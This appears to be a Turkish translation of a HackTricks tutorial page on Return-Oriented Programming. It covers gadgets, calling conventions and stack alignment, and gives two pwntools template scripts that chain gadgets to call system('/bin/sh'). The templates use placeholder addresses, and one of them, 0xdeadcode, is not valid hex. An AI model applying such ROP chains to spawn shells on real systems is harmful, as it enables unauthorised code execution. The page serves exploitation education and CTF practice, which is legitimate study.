# ROP - Return Oriented Programing

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
- **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi güvenlik önlemlerini atlatmak için kullanılan gelişmiş bir sızma tekniğidir. Bir saldırgan, kabuk kodu enjekte etmek ve yürütmek yerine, ikili dosyada veya yüklenmiş kütüphanelerde zaten bulunan kod parçalarını, yani **"gadget"**'ları kullanır. Her gadget genellikle bir `ret` talimatı ile biter ve veri kaydırma veya aritmetik işlemler gibi küçük bir işlem gerçekleştirir. Bu gadget'ları bir araya getirerek, bir saldırgan, NX/DEP korumalarını atlayarak keyfi işlemler gerçekleştirmek için bir yük oluşturabilir.

### ROP Nasıl Çalışır

1. **Kontrol Akışı Kaçırma**: İlk olarak, bir saldırganın bir programın kontrol akışını kaçırması gerekir, genellikle bir tampon taşması kullanarak yığın üzerinde kaydedilmiş bir dönüş adresini üzerine yazarak.
2. **Gadget Zinciri**: Saldırgan daha sonra istenen işlemleri gerçekleştirmek için dikkatlice gadget'ları seçer ve birbirine bağlar. Bu, bir işlev çağrısı için argümanları ayarlamayı, işlevi çağırmayı (örneğin, `system("/bin/sh")`), ve gerekli temizlik veya ek işlemleri ele almayı içerebilir.
3. **Yük Yürütme**: Zayıf işlev geri döndüğünde, meşru bir konuma dönmemek yerine, gadget zincirini yürütmeye başlar.

## ROP Zinciri x86 Örneği

### **x86 (32-bit) Çağrı konvansiyonları**

- **cdecl**: Çağrı yapan yığını temizler. İşlev argümanları yığına ters sırayla itilir (sağdan sola). **Argümanlar sağdan sola doğru yığına itilir.**
- **stdcall**: cdecl'ye benzer, ancak yığını temizleme işlemi çağrıyı alanın sorumluluğundadır.

### **Gadget'lar Bulma**

Öncelikle, ikili dosyada veya yüklenmiş kütüphanelerde gerekli gadget'ları tanımladığımızı varsayalım. İlgilendiğimiz gadget'lar şunlardır:

- `pop eax; ret`: Bu gadget, yığının en üst değerini `EAX` kaydedicisine iter ve ardından döner, böylece `EAX` üzerinde kontrol sağlar.
- `pop ebx; ret`: Yukarıdakiyle benzer, ancak `EBX` kaydedicisi için, `EBX` üzerinde kontrol sağlar.
- `mov [ebx], eax; ret`: `EAX` içindeki değeri, `EBX` tarafından işaret edilen bellek konumuna taşır ve ardından döner.
- Ayrıca, `system()` işlevinin adresine sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, ROP zinciri yürütmesi için yığını aşağıdaki gibi hazırlıyoruz ve `system('/bin/sh')`'yi yürütmeyi amaçlıyoruz, zincirin nasıl başladığına dikkat edin:

1. Hizalama amaçlı bir `ret` talimatı (isteğe bağlı)
2. `system` işlevinin adresi (ASLR devre dışı bırakılmış ve bilinen libc varsayılarak, daha fazla bilgi için [**Ret2lib**](ret2lib/))
3. `system()`'den dönüş adresi için yer tutucu
4. `"/bin/sh"` dizesi adresi (sistem işlevi için parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Zinciri x64 Örneği

### **x64 (64-bit) Çağrı Kuralları**

* Unix benzeri sistemlerde **System V AMD64 ABI** çağrı kuralını kullanır, burada **ilk altı tamsayı veya işaretçi argüman `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9`** registerlerine iletilir. Ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerine yerleştirilir.
* **Windows x64** çağrı kuralı ilk dört tamsayı veya işaretçi argümanlar için `RCX`, `RDX`, `R8` ve `R9` kullanır, ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerine yerleştirilir.
* **Registerler**: 64-bit registerler arasında `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8` ile `R15` bulunur.

#### **Gadget'lar Bulma**

Amacımız için, **RDI** registerini ayarlamamıza ( **system()** fonksiyonuna **"/bin/sh"** dizesini argüman olarak iletmek için) ve ardından **system()** fonksiyonunu çağırmamıza izin verecek gadget'lara odaklanalım. Aşağıdaki gadget'ları tanımladığımızı varsayalım:

* **pop rdi; ret**: Yığının en üst değerini **RDI** registerine çıkarır ve ardından döner. **system()** için argümanımızı ayarlamak için temel önemlidir.
* **ret**: Basit bir dönüş, bazı senaryolarda yığın hizalaması için kullanışlıdır.

Ve **system()** fonksiyonunun adresini biliyoruz.

### **ROP Zinciri**

Aşağıda, **system('/bin/sh')**'yi çalıştırmayı amaçlayan bir ROP zinciri oluşturmak ve yürütmek için **pwntools** kullanarak bir örnek bulunmaktadır:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### Yığın Taşıma

* **`pop rdi; ret`** cihazını kullanarak **`RDI`**'yi **`"/bin/sh"`** adresine ayarlıyoruz.
* **`RDI`**'yi ayarladıktan sonra doğrudan **`system()`**'a atlıyoruz, **system()**'ın adresi zincirde.
* **Hedef ortam gerektiriyorsa, **`ret_gadget`** hizalaması için kullanılır, bu daha yaygındır **x64**'te işlevleri çağırmadan önce uygun yığın hizalamasını sağlamak için.

### Yığın Hizalaması

**x86-64 ABI**, bir **çağrı talimatı** yürütüldüğünde **yığının 16 bayt hizalandığını** sağlar. **LIBC**, performansı optimize etmek için **SSE talimatları** (örneğin **movaps**) kullanır ve bu hizalamayı gerektirir. Yığın uygun şekilde hizalanmazsa (yani **RSP** 16'nın katı değilse), **ROP zincirinde** **system** gibi işlevlere çağrılar başarısız olur. Bunun düzeltilmesi için, ROP zincirinizde **system**'i çağırmadan önce bir **ret cihazı** ekleyin.

## x86'ya karşı x64 ana fark

{% hint style="success" %}
x64, ilk birkaç argüman için kayıtları kullandığından, basit işlev çağrıları için genellikle x86'dan daha az cihaz gerektirir, ancak doğru cihazları bulmak ve zincirlemek, artan kayıt sayısı ve daha büyük adres alanı nedeniyle daha karmaşık olabilir. Artan kayıt sayısı ve daha büyük adres alanı, özellikle Return-Oriented Programming (ROP) bağlamında, hem fırsatlar hem de zorluklar sunar.
{% endhint %}

## Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Yığın Kanaryaları**](../common-binary-protections-and-bypasses/stack-canaries/)

## Diğer Örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP tabanlı teknikler

ROP'nin yalnızca keyfi kodu yürütmek için bir teknik olduğunu unutmayın. ROP'a dayalı birçok Ret2XXX tekniği geliştirildi:

* **Ret2lib**: ROP'u yüklenmiş bir kütüphaneden keyfi parametrelerle keyfi işlevleri çağırmak için kullanın (genellikle `system('/bin/sh')` gibi bir şey).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP'u bir sistem çağrısını hazırlamak için kullanın, örneğin `execve`, ve bunu keyfi komutları yürütmek için kullanın.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret ve EBP Zincirleme**: İlk olarak, akışı kontrol etmek için EBP'yi EIP yerine kötüye kullanacak ve ikincisi Ret2lib'e benzer, ancak bu durumda akış çoğunlukla EBP adresleriyle kontrol edilir (ancak EIP'nin de kontrol edilmesi gerekmektedir).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}
